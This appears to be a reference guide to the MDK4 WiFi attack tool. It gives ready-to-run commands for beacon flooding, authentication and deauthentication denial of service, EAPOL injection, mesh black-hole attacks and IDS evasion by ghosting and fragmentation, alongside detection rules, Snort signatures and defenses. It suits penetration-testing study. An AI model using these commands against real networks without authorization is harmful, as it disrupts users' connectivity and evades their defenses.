# MDK4 - Advanced WiFi Protocol Vulnerability Testing Tool

## Overview

MDK4 is the successor to MDK3, representing a significant advancement in WiFi protocol vulnerability testing. Developed by E7mer of 360PegasusTeam and maintained by ASPj of k2wrlz, MDK4 expands on MDK3's capabilities with additional attack modules, improved performance, and new features like IDS evasion through ghosting and packet fragmentation.

**Author**: E7mer (360PegasusTeam), ASPj (k2wrlz)
**License**: GPLv3
**Version**: 4.2
**Category**: Impact / WiFi Attack

### Key Improvements Over MDK3

- **10 Attack Modules** (vs 8 in MDK3)
- **IDS Evasion**: Ghosting and Fragmenting
- **802.11s Mesh Network Attacks**
- **EAPOL Injection Attacks**
- **Packet Fuzzer Module**
- **Enhanced Performance**

### Supported Attack Modes

| Mode | Name | Description |
|------|------|-------------|
| `b` | Beacon Flooding | Fake APs with channel hopping |
| `a` | Authentication DoS | Auth frame flooding |
| `p` | SSID Probing | SSID discovery and bruteforce |
| `d` | Deauth/Disassoc | Client disconnection |
| `m` | Michael Shutdown | TKIP exploitation |
| `e` | EAPOL Injection | 802.1X session flooding |
| `s` | Mesh Attacks | 802.11s mesh network attacks |
| `w` | WIDS Confusion | IDS/IPS evasion |
| `f` | Packet Fuzzer | Protocol fuzzing |
| `x` | Protocol PoC | Implementation vulnerability testing |

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install mdk4
```

### Dependencies

- aircrack-ng
- libc6
- libnl-3-200
- libnl-genl-3-200
- libpcap0.8t64

### Manual Installation

```bash
git clone https://github.com/aircrack-ng/mdk4.git
cd mdk4
make
sudo make install
```

## Usage

### Basic Syntax

```bash
mdk4 <interface> <attack_mode> [options]
mdk4 <interface in> <interface out> <attack_mode> [options]
```

### IDS Evasion Options

**Ghosting**:
```bash
mdk4 wlan0 b --ghost <period>,<max_rate>,<min_txpower>
```

**Fragmenting**:
```bash
mdk4 wlan0 d --frag <min_frags>,<max_frags>,<percent>
```

## Detailed Attack Modes

### Beacon Flooding (b)

Sends beacon frames to show fake APs. Can crash network scanners and drivers.

```bash
# Basic beacon flood
mdk4 wlan0 b

# Custom ESSID and channel
mdk4 wlan0 b -n "EvilAP" -c 6

# WPA encrypted fake AP
mdk4 wlan0 b -n "SecureAP" -w 1

# With ghosting
mdk4 wlan0 b --ghost 1000,54,10

# Channel hopping
mdk4 wlan0 b -c 1,6,11
```

**Options**:
```
-n NAME       # Network name
-c CHANNEL    # Channel(s)
-w            # WPA encrypted
-h            # Hidden SSID
```

### Authentication Denial-of-Service (a)

Sends authentication frames to all APs found in range.

```bash
# Basic auth DoS
mdk4 wlan0 a

# Target specific channel
mdk4 wlan0 a -c 6

# Target specific AP
mdk4 wlan0 a -i AA:BB:CC:DD:EE:FF

# With ghosting
mdk4 wlan0 a --ghost 500,54,10
```

### SSID Probing and Bruteforcing (p)

Probes APs and checks for response. Useful for SSID discovery.

```bash
# Basic probing
mdk4 wlan0 p

# SSID bruteforce with wordlist
mdk4 wlan0 p -f /usr/share/wordlists/rockyou.txt

# Check specific channel
mdk4 wlan0 p -c 6
```

**Options**:
```
-f FILE       # Wordlist for bruteforce
-c CHANNEL    # Target channel
```

### Deauthentication and Disassociation (d)

Sends deauth/disassoc packets to disconnect clients.

```bash
# Deauth all clients
mdk4 wlan0 d

# Deauth specific channel
mdk4 wlan0 d -c 6

# Deauth specific client
mdk4 wlan0 d -m AA:BB:CC:DD:EE:FF

# Deauth specific AP
mdk4 wlan0 d -t AA:BB:CC:DD:EE:FF

# With fragmentation (IDS evasion)
mdk4 wlan0 d --frag 2,8,50

# With ghosting
mdk4 wlan0 d --ghost 1000,54,10
```

### Michael Countermeasures Exploitation (m)

Provoke Michael Countermeasures on TKIP APs.

```bash
# Basic Michael attack
mdk4 wlan0 m

# Target specific AP
mdk4 wlan0 m -c 6

# Target specific client
mdk4 wlan0 m -m AA:BB:CC:DD:EE:FF
```

### EAPOL Start and Logoff Packet Injection (e)

Floods AP with EAPOL Start frames or logs off clients.

```bash
# EAPOL Start flood
mdk4 wlan0 e

# EAPOL Logoff
mdk4 wlan0 e -l

# Target specific AP
mdk4 wlan0 e -i AA:BB:CC:DD:EE:FF
```

**Options**:
```
-l            # Send Logoff instead of Start
-i AP_MAC     # Target AP
```

### IEEE 802.11s Mesh Network Attacks (s)

Various attacks on mesh network link management and routing.

```bash
# Basic mesh attack
mdk4 wlan0 s

# Flood mesh links
mdk4 wlan0 s -f

# Create black holes
mdk4 wlan0 s -b

# Divert traffic
mdk4 wlan0 s -d
```

**Options**:
```
-f            # Flood neighbors and routes
-b            # Create black holes
-d            # Divert traffic
```

### WIDS Confusion (w)

Confuse/abuse intrusion detection and prevention systems.

```bash
# Basic WIDS confusion
mdk4 wlan0 w

# Cross-connect clients
mdk4 wlan0 w -c

# Fake rogue APs
mdk4 wlan0 w -r
```

### Packet Fuzzer (f)

Simple packet fuzzer with multiple sources and modifiers.

```bash
# Basic fuzzing
mdk4 wlan0 f

# Custom fuzzer settings
mdk4 wlan0 f -s 100 -m 50
```

### Proof-of-Concept Protocol Testing (x)

Test whether devices have WiFi vulnerabilities.

```bash
# Basic PoC test
mdk4 wlan0 x

# Target specific vulnerability
mdk4 wlan0 x -v 1
```

## Attack Scenarios

### Scenario 1: Enterprise WiFi Security Assessment

**Objective**: Test comprehensive WiFi security

```bash
# Start monitor mode
airmon-ng start wlan0

# Beacon flood test
mdk4 wlan0mon b -n "RogueAP" -c 6

# Auth DoS test
mdk4 wlan0mon a -c 6

# Deauth test
mdk4 wlan0mon d -c 6

# EAPOL injection test
mdk4 wlan0mon e
```

### Scenario 2: Hidden Network Discovery

**Objective**: Discover hidden SSIDs

```bash
# Probe all networks
mdk4 wlan0 p

# Bruteforce with wordlist
mdk4 wlan0 p -f /usr/share/wordlists/rockyou.txt
```

### Scenario 3: WIDS Evasion Testing

**Objective**: Test intrusion detection evasion

```bash
# Ghosting mode
mdk4 wlan0 d --ghost 1000,54,10

# Fragmentation mode
mdk4 wlan0 d --frag 2,8,50

# Combined evasion
mdk4 wlan0 d --ghost 500,54,10 --frag 2,8,50
```

### Scenario 4: 802.1X Network Testing

**Objective**: Test port-based authentication

```bash
# EAPOL Start flood
mdk4 wlan0 e

# Monitor RADIUS server
tail -f /var/log/radius/radius.log
```

### Scenario 5: Mesh Network Testing

**Objective**: Test 802.11s mesh resilience

```bash
# Mesh flooding
mdk4 wlan0 s -f

# Black hole attack
mdk4 wlan0 s -b

# Traffic diversion
mdk4 wlan0 s -d
```

## IDS Evasion Techniques

### Ghosting

Ghosting evades IDS by dynamically changing transmission rate and power.

```bash
# Syntax: --ghost <period>,<max_rate>,<min_txpower>
mdk4 wlan0 d --ghost 1000,54,10

# Parameters:
# period: How often to switch (ms)
# max_rate: Maximum bitrate (MBit)
# min_txpower: Minimum TX power (dBm)
```

### Fragmenting

Fragmenting splits packets into fragments to avoid IDS detection.

```bash
# Syntax: --frag <min_frags>,<max_frags>,<percent>
mdk4 wlan0 d --frag 2,8,50

# Parameters:
# min_frags: Minimum fragments
# max_frags: Maximum fragments (0 = standard compliance)
# percent: Percentage of packets to fragment
```

### Combined Evasion

```bash
# Use both techniques
mdk4 wlan0 d --ghost 500,54,10 --frag 2,8,50
```

## Detection Methods

### WiFi Monitoring

```bash
# Monitor beacon frames
airodump-ng wlan0mon

# Detect deauth floods
tcpdump -i wlan0mon 'type mgt subtype deauth'

# Monitor EAPOL traffic
tcpdump -i wlan0mon 'ether proto 0x888e'

# Detect auth storms
tcpdump -i wlan0mon 'type mgt subtype auth'
```

### IDS Signatures

```
# Snort signature for WiFi DoS
alert wifi any any -> any any (
    msg:"MDK4 deauth flood";
    wifi_type deauth;
    detection_filter:track by_src, count 10, seconds 1;
    sid:1000001; rev:1;
)

# EAPOL flood
alert wifi any any -> any any (
    msg:"EAPOL flood detected";
    wifi_type data;
    content:"|88 8e|";
    detection_filter:track by_src, count 100, seconds 1;
    sid:1000002; rev:1;
)
```

## Defense Mechanisms

### WiFi Security Configuration

**WPA3/SAE**:
```
# Use WPA3 with SAE
# Resistant to offline attacks
# Protected management frames
```

**802.11w (PMF)**:
```
# Enable Protected Management Frames
# Required for WPA3
# Prevents deauth attacks
```

**802.11r (FT)**:
```
# Fast BSS Transition
# Reduces reassociation time
# Improves roaming security
```

### Network Infrastructure

**WIDS/WIPS**:
```
# Deploy wireless intrusion detection
# Monitor for fake APs
# Alert on anomalous behavior
```

**Rogue AP Detection**:
```
# Regular scanning
# RF monitoring
# Behavioral analysis
```

### Client Protection

```bash
# Disable auto-connect
# Verify SSID before connecting
# Use VPN for sensitive traffic
# Enable firewall
```

## Real-World Applications

### Legitimate Testing

1. **Penetration Testing**: Comprehensive WiFi security assessments
2. **Compliance Audits**: Verify wireless security controls
3. **Incident Response**: Test detection and response
4. **Research**: Protocol vulnerability discovery

### Testing Methodology

```
1. Document wireless infrastructure
2. Identify all APs, clients, and protocols
3. Start with minimal impact tests
4. Monitor network and WIDS response
5. Document vulnerabilities found
6. Implement mitigations
7. Re-test to verify fixes
```

## Comparison: MDK3 vs MDK4

| Feature | MDK3 | MDK4 |
|---------|------|------|
| Attack Modes | 8 | 10 |
| Mesh Attacks | No | Yes |
| EAPOL Injection | No | Yes |
| Packet Fuzzer | No | Yes |
| IDS Evasion | No | Ghosting/Fragmenting |
| Protocol PoC | No | Yes |
| License | GPLv2 | GPLv3 |
| Active Development | Archived | Active |

## Output Examples

### Authentication DoS

```bash
$ mdk4 wlan0 a

MDK4 4.2 - WiFi testing tool
Trying to get a new target AP...
AP AA:BB:CC:DD:EE:FF is responding!
Connecting Client: 00:00:00:00:00:00 to target AP: AA:BB:CC:DD:EE:FF
...
```

### EAPOL Injection

```bash
$ mdk4 wlan0 e

MDK4 4.2 - EAPOL Start flood
Target: AA:BB:CC:DD:EE:FF
Sending EAPOL Start frames...
```

### Mesh Attack

```bash
$ mdk4 wlan0 s -f

MDK4 4.2 - Mesh network flooding
Flooding mesh neighbors and routes...
```

## Limitations

- Requires monitor mode interface
- Needs injection-capable wireless adapter
- Effectiveness depends on AP implementation
- PMF can prevent many attacks
- Modern APs may have better protection

## Troubleshooting

### No Monitor Mode

```bash
# Start monitor mode
airmon-ng start wlan0

# Check interface
iwconfig wlan0mon
```

### Injection Not Working

```bash
# Test injection
aireplay-ng -9 wlan0mon

# Check driver support
iw list
```

### Permission Denied

```bash
# Run as root
sudo mdk4 wlan0mon a
```

## Legal Notice

MDK4 is a legitimate security testing tool designed to verify wireless network resilience. Unauthorized use against networks you do not own or have explicit permission to test is illegal and unethical. This tool should only be used in controlled testing environments with proper authorization.

## References

- IEEE 802.11 Standard
- IEEE 802.11s Mesh Networking
- IEEE 802.1X Port-Based Authentication
- Aircrack-ng Documentation
- WiFi Security Best Practices
